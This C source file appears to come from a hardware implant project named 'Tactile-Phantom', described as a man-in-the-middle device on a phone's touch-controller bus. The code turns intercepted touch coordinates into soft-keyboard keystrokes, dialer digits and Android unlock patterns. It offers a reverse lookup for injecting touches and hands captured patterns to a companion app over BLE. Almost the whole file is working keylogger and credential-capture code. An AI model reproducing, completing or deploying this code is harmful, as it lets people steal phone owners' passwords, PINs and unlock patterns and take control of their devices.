/*
 * Tactile-Phantom — Touch-Controller Bus MITM Implant
 * layout_infer.c — Screen layout model, keystroke/pattern reconstruction
 *
 * Author: jayis1
 * License: GPL-2.0
 *
 * Maps raw touch coordinates to semantic UI elements:
 *   - Soft-keyboard: coordinates -> typed character
 *   - Dialer pad: coordinates -> digit
 *   - Android unlock grid: coordinate sequence -> pattern
 *   - Custom layouts: operator-defined key positions
 *
 * The layout model is received from the companion app and stored in
 * a layout table. The inference engine looks up which key a coordinate
 * falls within.
 */

#include <string.h>
#include <stdio.h>
#include "pico/stdlib.h"
#include "board.h"

/* --- Layout key definition ----------------------------------------- */
typedef struct {
    uint16_t x;      /* center X */
    uint16_t y;      /* center Y */
    uint16_t width;  /* key width in pixels */
    uint16_t height; /* key height in pixels */
    char     label;  /* character label (0 = no label) */
} tp_layout_key_t;

#define TP_LAYOUT_MAX_KEYS 128

/* --- Current keyboard layout model -------------------------------- */
static tp_layout_key_t layout_keys[TP_LAYOUT_MAX_KEYS];
static uint16_t layout_key_count = 0;

/* --- Android unlock pattern grid (3x3) ------------------------------ */
/* The pattern grid positions are defined relative to screen resolution. */
static uint16_t grid_x_res, grid_y_res;
static uint8_t  grid_rows = 3, grid_cols = 3;
static bool     grid_configured = false;

/* --- Pattern tracking state ----------------------------------------- */
/* Tracks the sequence of grid nodes touched during a pattern entry. */
static uint8_t  pattern_sequence[9];  /* max 9 nodes */
static uint8_t  pattern_length = 0;
static bool     pattern_active = false;
static uint32_t pattern_last_time = 0;
#define PATTERN_TIMEOUT_US 500000  /* 500 ms gap ends pattern */

/* --- Set keyboard layout from app ---------------------------------- */
/* Layout is sent as a packed binary array:
 *   [0-1] key_count (LE)
 *   For each key (8 bytes):
 *     [0-1] x (LE), [2-3] y (LE), [4-5] width (LE), [6-7] height (LE)
 *   Followed by key_count label bytes. */
bool tp_layout_set_keyboard(const uint8_t *layout, uint16_t len)
{
    if (!layout || len < 2) return false;

    uint16_t count = layout[0] | (layout[1] << 8);
    if (count > TP_LAYOUT_MAX_KEYS) count = TP_LAYOUT_MAX_KEYS;

    uint16_t expected_len = 2 + (count * 8) + count;
    if (len < expected_len) {
        printf("[LAYOUT] Layout data too short: %u < %u\n", len, expected_len);
        return false;
    }

    layout_key_count = count;
    uint16_t offset = 2;
    for (uint16_t i = 0; i < count; i++) {
        layout_keys[i].x      = layout[offset] | (layout[offset+1] << 8);
        layout_keys[i].y      = layout[offset+2] | (layout[offset+3] << 8);
        layout_keys[i].width  = layout[offset+4] | (layout[offset+5] << 8);
        layout_keys[i].height = layout[offset+6] | (layout[offset+7] << 8);
        offset += 8;
    }
    /* Labels */
    for (uint16_t i = 0; i < count; i++) {
        layout_keys[i].label = (char)layout[offset + i];
    }

    printf("[LAYOUT] Loaded %u keys\n", layout_key_count);
    return true;
}

/* --- Set unlock pattern grid --------------------------------------- */
bool tp_layout_set_grid(uint16_t width, uint16_t height,
                         uint8_t rows, uint8_t cols)
{
    grid_x_res = width;
    grid_y_res = height;
    grid_rows = rows;
    grid_cols = cols;
    grid_configured = true;
    printf("[LAYOUT] Grid: %ux%u, %u rows x %u cols\n",
           width, height, rows, cols);
    return true;
}

/* --- Infer keystroke from coordinate ------------------------------- */
/* Returns true if the coordinate falls within a key's bounding box. */
bool tp_layout_infer_keystroke(uint16_t x, uint16_t y, char *out_char)
{
    for (uint16_t i = 0; i < layout_key_count; i++) {
        const tp_layout_key_t *k = &layout_keys[i];
        /* Check if (x,y) is within the key's bounding box */
        int32_t dx = (int32_t)x - (int32_t)k->x;
        int32_t dy = (int32_t)y - (int32_t)k->y;
        int32_t half_w = k->width / 2;
        int32_t half_h = k->height / 2;

        if (dx >= -half_w && dx <= half_w &&
            dy >= -half_h && dy <= half_h) {
            *out_char = k->label;
            return true;
        }
    }
    return false;
}

/* --- Reverse lookup: character to coordinate (for injection) ------- */
bool tp_layout_char_to_coord(char ch, uint16_t *out_x, uint16_t *out_y)
{
    for (uint16_t i = 0; i < layout_key_count; i++) {
        if (layout_keys[i].label == ch) {
            *out_x = layout_keys[i].x;
            *out_y = layout_keys[i].y;
            return true;
        }
    }
    return false;
}

/* --- Android unlock pattern reconstruction ------------------------- */
/* The Android unlock pattern uses a 3x3 grid. Each node is at:
 *   x = (col + 0.5) * (screen_width / 3)
 *   y = (row + 0.5) * (screen_height * 0.8 / 3) + offset
 * (approximate; actual position varies by device). */
static int8_t coord_to_grid_node(uint16_t x, uint16_t y)
{
    if (!grid_configured) return -1;

    /* Calculate grid cell size */
    uint16_t cell_w = grid_x_res / grid_cols;
    uint16_t cell_h = (grid_y_res * 8 / 10) / grid_rows;  /* grid in top 80% */
    uint16_t grid_offset_y = grid_y_res / 10;  /* 10% top margin */

    /* Find which cell the coordinate falls in */
    int col = x / cell_w;
    int row = (y - grid_offset_y) / (int)cell_h;

    if (col < 0 || col >= grid_cols || row < 0 || row >= grid_rows)
        return -1;

    /* Check that the coordinate is near the center of the cell
     * (within 40% of cell size from center) */
    uint16_t cx = col * cell_w + cell_w / 2;
    uint16_t cy = row * cell_h + cell_h / 2 + grid_offset_y;
    int32_t dx = (int32_t)x - (int32_t)cx;
    int32_t dy = (int32_t)y - (int32_t)cy;

    if (dx < 0) dx = -dx;
    if (dy < 0) dy = -dy;

    if (dx > cell_w * 4 / 10 || dy > cell_h * 4 / 10)
        return -1;  /* too far from center */

    return (int8_t)(row * grid_cols + col);
}

/* Process a touch event for pattern tracking.
 * Called by the decode pipeline when a touch-down event is detected. */
void tp_layout_pattern_track(uint16_t x, uint16_t y, bool is_down)
{
    uint32_t now = time_us_32();

    if (is_down) {
        int8_t node = coord_to_grid_node(x, y);
        if (node >= 0) {
            /* Check if this node is already in the sequence */
            bool found = false;
            for (uint8_t i = 0; i < pattern_length; i++) {
                if (pattern_sequence[i] == (uint8_t)node) {
                    found = true;
                    break;
                }
            }
            if (!found && pattern_length < 9) {
                pattern_sequence[pattern_length++] = (uint8_t)node;
                pattern_active = true;
                pattern_last_time = now;
                printf("[PATTERN] Node %u added (len=%u)\n",
                       (uint8_t)node, pattern_length);
            }
        }
    } else {
        /* Touch release: check for pattern timeout */
        if (pattern_active && (now - pattern_last_time) > PATTERN_TIMEOUT_US) {
            printf("[PATTERN] Complete: len=%u [", pattern_length);
            for (uint8_t i = 0; i < pattern_length; i++)
                printf("%u ", pattern_sequence[i]);
            printf("]\n");
            pattern_active = false;
            pattern_length = 0;
        }
    }
}

/* Get the current pattern sequence (for BLE streaming) */
bool tp_layout_get_pattern(uint8_t *out_seq, uint8_t *out_len)
{
    if (pattern_length == 0) return false;
    memcpy(out_seq, pattern_sequence, pattern_length);
    *out_len = pattern_length;
    return true;
}

/* --- Default QWERTY layout generator ------------------------------- */
/* If no layout is received from the app, generate a default QWERTY
 * layout for a 1080x2400 screen (common Android phone resolution). */
void tp_layout_default_qwerty(uint16_t screen_w, uint16_t screen_h)
{
    /* Keyboard occupies bottom ~30% of screen */
    uint16_t kb_top = screen_h * 70 / 100;
    uint16_t kb_h = screen_h * 25 / 100;
    uint16_t key_w = screen_w / 10;
    uint16_t key_h = kb_h / 4;

    /* Row 1: Q W E R T Y U I O P */
    const char row1[] = "QWERTYUIOP";
    /* Row 2: A S D F G H J K L */
    const char row2[] = "ASDFGHJKL";
    /* Row 3: Z X C V B N M */
    const char row3[] = "ZXCVBNM";

    layout_key_count = 0;
    uint16_t y = kb_top;

    /* Row 1 */
    for (uint8_t i = 0; row1[i]; i++) {
        layout_keys[layout_key_count].x = i * key_w + key_w / 2;
        layout_keys[layout_key_count].y = y + key_h / 2;
        layout_keys[layout_key_count].width = key_w;
        layout_keys[layout_key_count].height = key_h;
        layout_keys[layout_key_count].label = row1[i];
        layout_key_count++;
    }
    y += key_h;

    /* Row 2 (offset by half key) */
    for (uint8_t i = 0; row2[i]; i++) {
        layout_keys[layout_key_count].x = i * key_w + key_w + key_w / 2;
        layout_keys[layout_key_count].y = y + key_h / 2;
        layout_keys[layout_key_count].width = key_w;
        layout_keys[layout_key_count].height = key_h;
        layout_keys[layout_key_count].label = row2[i];
        layout_key_count++;
    }
    y += key_h;

    /* Row 3 (offset by 1.5 keys for Z) */
    for (uint8_t i = 0; row3[i]; i++) {
        layout_keys[layout_key_count].x = i * key_w + (key_w * 3 / 2) + key_w / 2;
        layout_keys[layout_key_count].y = y + key_h / 2;
        layout_keys[layout_key_count].width = key_w;
        layout_keys[layout_key_count].height = key_h;
        layout_keys[layout_key_count].label = row3[i];
        layout_key_count++;
    }
    y += key_h;

    /* Row 4: space bar */
    layout_keys[layout_key_count].x = screen_w / 2;
    layout_keys[layout_key_count].y = y + key_h / 2;
    layout_keys[layout_key_count].width = screen_w * 60 / 100;
    layout_keys[layout_key_count].height = key_h;
    layout_keys[layout_key_count].label = ' ';
    layout_key_count++;

    printf("[LAYOUT] Default QWERTY: %u keys for %ux%u\n",
           layout_key_count, screen_w, screen_h);
}